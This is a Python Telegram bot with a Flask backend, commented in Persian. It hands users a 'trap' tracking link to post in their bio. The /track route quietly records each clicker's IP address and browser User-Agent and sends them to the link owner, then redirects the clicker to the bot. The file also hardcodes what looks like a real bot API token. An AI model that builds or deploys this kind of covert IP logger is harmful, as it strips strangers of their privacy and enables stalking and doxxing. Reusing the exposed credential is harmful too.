import os
import sqlite3
import random
import string
from datetime import datetime
from flask import Flask, request, redirect, jsonify
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
import threading

# ---------- تنظیمات اولیه ----------
TOKEN = "8981742192:AAHC8z6u6GifXgMIafvzv0tn_Q2LV1mM2bQ"
BOT_USERNAME = "nevergivup_bot"  # یوزرنیم ربات
BASE_URL = "https://barcelona-l5tu.onrender.com"
CHANNELS = ["@film01385"]
CHANNEL_NAMES = {
    "@film01385": "کانال اول",
}

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# ---------- دیکشنری برای ذخیره پیام لینک هر کاربر ----------
user_link_messages = {}

# ---------- دیتابیس ----------
conn = sqlite3.connect("/tmp/tracker.db", check_same_thread=False)
c = conn.cursor()

c.execute("""CREATE TABLE IF NOT EXISTS users (
    telegram_id INTEGER PRIMARY KEY,
    link_code TEXT UNIQUE,
    link_full TEXT UNIQUE
)""")

c.execute("""CREATE TABLE IF NOT EXISTS clicks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    link_code TEXT,
    clicker_id INTEGER,
    ip TEXT,
    user_agent TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
)""")

c.execute("""CREATE TABLE IF NOT EXISTS user_settings (
    telegram_id INTEGER PRIMARY KEY,
    capture_text TEXT,
    capture_photo_id TEXT
)""")
conn.commit()

# ---------- توابع کمکی ----------
def get_ip():
    forwarded = request.headers.get('X-Forwarded-For')
    if forwarded:
        return forwarded.split(',')[0]
    return request.remote_addr

def generate_link(telegram_id):
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    full_link = f"{BASE_URL}/track/{code}"  # ابتدا به سرور ما میاد
    c.execute("INSERT OR REPLACE INTO users (telegram_id, link_code, link_full) VALUES (?, ?, ?)", 
              (telegram_id, code, full_link))
    conn.commit()
    return full_link

def get_owner_id_by_code(code):
    c.execute("SELECT telegram_id FROM users WHERE link_code = ?", (code,))
    result = c.fetchone()
    return result[0] if result else None

def get_user_capture_text(user_id):
    c.execute("SELECT capture_text FROM user_settings WHERE telegram_id = ?", (user_id,))
    result = c.fetchone()
    return result[0] if result else "🎯 یک نفر روی لینک اختصاصی شما کلیک کرد!"

def get_user_capture_photo(user_id):
    c.execute("SELECT capture_photo_id FROM user_settings WHERE telegram_id = ?", (user_id,))
    result = c.fetchone()
    return result[0] if result else None

def save_user_settings(user_id, text=None, photo_id=None):
    c.execute("SELECT * FROM user_settings WHERE telegram_id = ?", (user_id,))
    if c.fetchone():
        if text:
            c.execute("UPDATE user_settings SET capture_text = ? WHERE telegram_id = ?", (text, user_id))
        if photo_id:
            c.execute("UPDATE user_settings SET capture_photo_id = ? WHERE telegram_id = ?", (photo_id, user_id))
    else:
        c.execute("INSERT INTO user_settings (telegram_id, capture_text, capture_photo_id) VALUES (?, ?, ?)",
                  (user_id, text, photo_id))
    conn.commit()

def get_clicker_info(clicker_id):
    """دریافت اطلاعات کامل شخصی که روی لینک کلیک کرده"""
    try:
        chat = bot.get_chat(clicker_id)
        first_name = chat.first_name or ""
        last_name = chat.last_name or ""
        name = f"{first_name} {last_name}".strip()
        username = f"@{chat.username}" if chat.username else "ندارد"
        
        bio = "ندارد"
        try:
            if hasattr(chat, 'bio') and chat.bio:
                bio = chat.bio
        except:
            pass
            
        photo_file_id = None
        try:
            photos = bot.get_user_profile_photos(clicker_id, limit=1)
            if photos.total_count > 0:
                photo_file_id = photos.photos[0][-1].file_id
        except:
            pass
            
        return {
            "name": name if name else "ناشناس",
            "username": username,
            "bio": bio,
            "photo_id": photo_file_id,
            "telegram_id": clicker_id
        }
    except Exception as e:
        print(f"Error getting user info for {clicker_id}: {e}")
        return {
            "name": "کاربر ناشناس",
            "username": "نامشخص",
            "bio": "برای مشاهده اطلاعات، ابتدا ربات را استارت کنید",
            "photo_id": None,
            "telegram_id": clicker_id
        }

# ---------- بررسی عضویت ----------
def is_user_member(user_id):
    for channel in CHANNELS:
        try:
            member = bot.get_chat_member(channel, user_id)
            if member.status not in ['member', 'administrator', 'creator']:
                return False
        except:
            return False
    return True

# ---------- ایجاد Reply Keyboard ----------
def get_main_reply_keyboard():
    keyboard = ReplyKeyboardMarkup(
        row_width=2,
        resize_keyboard=True,
        one_time_keyboard=False,
        input_field_placeholder="یک گزینه را انتخاب کنید..."
    )
    
    btn_get_link = KeyboardButton("🔗 دریافت لینک من")
    btn_buy_sub = KeyboardButton("💰 خرید اشتراک پرو")
    btn_buy_shield = KeyboardButton("🛡 خرید سپر")
    btn_set_photo = KeyboardButton("🖼 تنظیم عکس مچ‌گیری")
    btn_set_text = KeyboardButton("✏️ تنظیم متن مچ‌گیری")
    btn_help = KeyboardButton("📖 راهنما")
    
    keyboard.add(btn_get_link, btn_buy_sub)
    keyboard.add(btn_buy_shield, btn_set_photo)
    keyboard.add(btn_set_text, btn_help)
    
    return keyboard

def show_panel(chat_id, message_id=None):
    text = "👋 به پنل کاربری خود خوش آمدید.\n\nلطفاً یکی از گزینه‌های زیر را انتخاب کنید:"
    reply_keyboard = get_main_reply_keyboard()
    
    if message_id:
        try:
            bot.edit_message_text(text, chat_id, message_id)
        except:
            pass
        bot.send_message(chat_id, "کیبورد در پایین صفحه فعال است.", reply_markup=reply_keyboard)
    else:
        bot.send_message(chat_id, text, reply_markup=reply_keyboard)

# ---------- هندلر دکمه‌های Reply Keyboard ----------
@bot.message_handler(func=lambda message: True)
def handle_reply_buttons(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    text = message.text
    
    if not is_user_member(user_id):
        keyboard = InlineKeyboardMarkup(row_width=1)
        for channel in CHANNELS:
            display_name = CHANNEL_NAMES.get(channel, channel)
            keyboard.add(InlineKeyboardButton(f"🔹 {display_name}", url=f"https://t.me/{channel[1:]}"))
        keyboard.add(InlineKeyboardButton("✅ عضو شدم", callback_data="check_membership"))
        bot.reply_to(message, "👋 برای استفاده از ربات ابتدا در کانال های زیر عضو شوید:", reply_markup=keyboard)
        return
    
    if text == "🔗 دریافت لینک من":
        link = generate_link(user_id)
        
        inline_keyboard = InlineKeyboardMarkup(row_width=2)
        inline_keyboard.add(
            InlineKeyboardButton("📋 کپی لینک من", callback_data=f"copy_link"),
            InlineKeyboardButton("🔒 مخفی کردن لینک", callback_data="hide_link")
        )
        
        msg = bot.send_message(
            chat_id,
            f"🔗 **لینک اختصاصی شما:**\n\n"
            f"`{link}`\n\n"
            f"⚠️ این لینک را در بیوگرافی خود قرار دهید تا ببینید چه کسانی پروفایل شما را می‌بینند.",
            reply_markup=inline_keyboard,
            parse_mode='Markdown'
        )
        
        user_link_messages[user_id] = {
            "chat_id": chat_id,
            "message_id": msg.message_id,
            "link_code": link.split('/')[-1]
        }
    
    elif text == "💰 خرید اشتراک پرو":
        bot.send_message(chat_id, "💰 بخش خرید اشتراک پرو در حال توسعه است.\nبه زودی...")
    
    elif text == "🛡 خرید سپر":
        bot.send_message(chat_id, "🛡 بخش خرید سپر در حال توسعه است.\nبه زودی...")
    
    elif text == "🖼 تنظیم عکس مچ‌گیری":
        msg = bot.send_message(
            chat_id,
            "🖼 لطفاً عکس مورد نظر خود را برای پیام مچ‌گیری ارسال کنید.\n\n"
            "پس از ارسال عکس، تنظیمات شما ذخیره می‌شود."
        )
        bot.register_next_step_handler(msg, receive_capture_photo)
    
    elif text == "✏️ تنظیم متن مچ‌گیری":
        msg = bot.send_message(
            chat_id,
            "✏️ لطفاً متن مورد نظر خود را برای پیام مچ‌گیری ارسال کنید.\n\n"
            "پس از ارسال متن، تنظیمات شما ذخیره می‌شود."
        )
        bot.register_next_step_handler(msg, receive_capture_text)
    
    elif text == "📖 راهنما":
        help_text = (
            "📚 **راهنمای جامع استفاده از ربات**\n\n"
            "۱. دکمه دریافت لینک را بزنید\n"
            "۲. لینک را در بیوگرافی خود قرار دهید\n"
            "۳. هر کس روی لینک کلیک کند، اطلاعاتش برای شما ارسال می‌شود\n"
            "۴. می‌توانید متن و عکس تله را شخصی‌سازی کنید"
        )
        bot.send_message(chat_id, help_text, parse_mode='Markdown')
    
    else:
        bot.send_message(chat_id, "❌ لطفاً از دکمه‌های زیر استفاده کنید.", reply_markup=get_main_reply_keyboard())

# ---------- هندلر دستور start ----------
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    
    if is_user_member(user_id):
        show_panel(message.chat.id)
    else:
        keyboard = InlineKeyboardMarkup(row_width=1)
        for channel in CHANNELS:
            display_name = CHANNEL_NAMES.get(channel, channel)
            keyboard.add(InlineKeyboardButton(f"🔹 {display_name}", url=f"https://t.me/{channel[1:]}"))
        keyboard.add(InlineKeyboardButton("✅ عضو شدم", callback_data="check_membership"))
        bot.reply_to(message, "👋 برای استفاده از ربات ابتدا در کانال های زیر عضو شوید:", reply_markup=keyboard)

# ========== مسیر ردیابی (مهم!) ==========
@app.route('/track/<code>')
def track_click(code):
    """این مسیر وقتی کسی روی لینک کلیک می‌کند فراخوانی می‌شود"""
    owner_id = get_owner_id_by_code(code)
    ip_address = get_ip()
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # ذخیره کلیک در دیتابیس
    c.execute("INSERT INTO clicks (link_code, ip, user_agent) VALUES (?, ?, ?)", 
              (code, ip_address, user_agent))
    conn.commit()
    
    # اگه صاحب لینک پیدا شد، بهش پیام بده
    if owner_id:
        capture_text = get_user_capture_text(owner_id)
        
        try:
            # ارسال پیام به صاحب لینک
            bot.send_message(
                owner_id,
                f"🎯 {capture_text}\n\n"
                f"📅 زمان: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"🌐 IP: {ip_address}\n"
                f"📱 مرورگر: {user_agent[:100]}"
            )
            print(f"Report sent to owner {owner_id}")
        except Exception as e:
            print(f"Error sending to owner: {e}")
    
    # هدایت کاربر به ربات
    return redirect(f"https://t.me/{BOT_USERNAME}", code=302)

# ---------- هندلر دکمه‌های Inline ----------
@bot.callback_query_handler(func=lambda call: True)
def handle_buttons(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if call.data == "check_membership":
        if is_user_member(user_id):
            try:
                bot.edit_message_text("✅ عضویت شما تأیید شد!", chat_id, call.message.message_id)
            except:
                pass
            show_panel(chat_id)
        else:
            bot.answer_callback_query(call.id, "❌ شما هنوز در همه کانال‌ها عضو نشده‌اید.", show_alert=True)
    
    elif call.data == "copy_link":
        if user_id in user_link_messages:
            link_code = user_link_messages[user_id]["link_code"]
            link = f"{BASE_URL}/track/{link_code}"
            bot.send_message(chat_id, f"🔗 لینک اختصاصی شما برای کپی:\n\n`{link}`", parse_mode='Markdown')
            bot.answer_callback_query(call.id, "✅ لینک برای کپی ارسال شد!")
    
    elif call.data == "hide_link":
        try:
            bot.edit_message_text("🔗 لینک شما مخفی شد. برای دریافت مجدد لینک، از پنل اصلی اقدام کنید.", chat_id, call.message.message_id)
        except:
            pass
        threading.Timer(2.0, lambda: show_panel(chat_id)).start()

# ---------- دریافت متن و عکس مچ‌گیری ----------
def receive_capture_text(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    text = message.text
    
    save_user_settings(user_id, text=text)
    bot.send_message(chat_id, f"✅ متن مچ‌گیری شما با موفقیت ذخیره شد:\n\n{text}")
    show_panel(chat_id)

def receive_capture_photo(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if message.photo:
        photo_id = message.photo[-1].file_id
        save_user_settings(user_id, photo_id=photo_id)
        bot.send_message(chat_id, "✅ عکس مچ‌گیری شما با موفقیت ذخیره شد.")
    else:
        bot.send_message(chat_id, "❌ لطفاً یک عکس معتبر ارسال کنید.")
    
    show_panel(chat_id)

# ========== مسیرهای Flask ==========
@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        json_str = request.get_data().decode('UTF-8')
        update = telebot.types.Update.de_json(json_str)
        bot.process_new_updates([update])
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print(f"Webhook error: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/health', methods=['GET'])
def health():
    return "OK", 200

@app.route('/', methods=['GET'])
def index():
    return "ربات آنلاین است", 200

def set_webhook():
    webhook_url = f"{BASE_URL}/webhook"
    result = bot.set_webhook(url=webhook_url)
    if result:
        print(f"✅ Webhook set: {webhook_url}")
    else:
        print("❌ Failed to set webhook")

if __name__ == '__main__':
    set_webhook()
    app.run(host='0.0.0.0', port=10000)
